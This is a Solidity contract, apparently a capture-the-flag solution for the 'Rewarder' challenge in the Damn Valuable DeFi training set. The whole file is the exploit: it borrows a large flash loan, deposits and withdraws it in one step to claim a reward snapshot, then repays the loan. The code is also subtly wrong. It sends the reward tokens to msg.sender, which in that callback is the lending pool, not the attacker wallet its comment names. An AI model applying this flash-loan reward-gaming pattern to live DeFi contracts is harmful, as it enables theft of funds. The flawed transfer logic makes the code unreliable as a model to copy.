// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";
import "../DamnValuableToken.sol";

contract RewarderAttacker {
    RewardToken public rewardToken;
    FlashLoanerPool public loanerPool;
    TheRewarderPool public rewarderPool;
    DamnValuableToken public immutable liquidityToken;

    constructor(
        address _rewardToken,
        address _loanerPool,
        address _rewarderPool,
        address liquidityTokenAddress
    ) {
        rewardToken = RewardToken(_rewardToken);
        loanerPool = FlashLoanerPool(_loanerPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        // take flashLoan for 1 mil Token
    }

    function attack() external {
        loanerPool.flashLoan(1_000_000 ether);
    }

    // gets called by FlashLoanPool contract
    function receiveFlashLoan(uint256 amount) external {
        uint256 balance = liquidityToken.balanceOf(address(this));
        liquidityToken.approve(address(rewarderPool), balance);
        rewarderPool.deposit(balance);
        rewarderPool.withdraw(balance);
        // Return funds to pool
        liquidityToken.transfer(address(loanerPool), amount);
        // transfer rewards to attackerWallet
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}
